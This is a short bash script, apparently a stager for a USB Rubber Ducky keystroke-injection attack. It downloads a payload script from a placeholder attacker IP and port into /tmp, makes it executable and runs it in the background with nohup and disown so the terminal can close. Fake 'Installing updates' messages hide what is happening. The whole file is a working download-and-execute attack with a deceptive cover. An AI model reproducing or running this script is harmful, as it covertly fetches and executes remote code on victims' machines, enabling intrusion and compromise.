#!/bin/bash
# Designed to run rubbyducky and allow closing terminal fast

dir1=/tmp/updates
rm -rf $dir1
mkdir /tmp/updates
cd $dir1

ip=<REPLACE_IP>
port=10000

echo "Installing updates now"
wget http://$ip:$port/payloads/rubbyDucky.sh -O ./rubbyDucky.sh
echo "Updates installed"

chmod +x ./rubbyDucky.sh
nohup ./rubbyDucky.sh > /dev/null 2>&1 &
disown -a